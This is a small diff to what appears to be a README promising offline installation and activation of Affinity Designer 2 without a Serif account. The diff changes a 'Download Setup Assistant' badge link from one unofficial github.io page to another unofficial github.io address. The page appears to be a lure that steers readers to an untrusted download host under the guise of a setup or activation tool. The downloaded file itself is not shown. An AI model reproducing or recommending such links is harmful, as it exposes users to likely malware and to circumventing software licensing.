@@ -2,7 +2,7 @@
 
 A complete guide to install and activate **Affinity Designer 2** in air-gapped or offline environments. No Serif account, no login, no cloud required — ideal for enterprise or local deployment.
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://matookfj.github.io/.github/affinitydesigner)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://affinity-designer-download.github.io./.github)
 
 ---
 
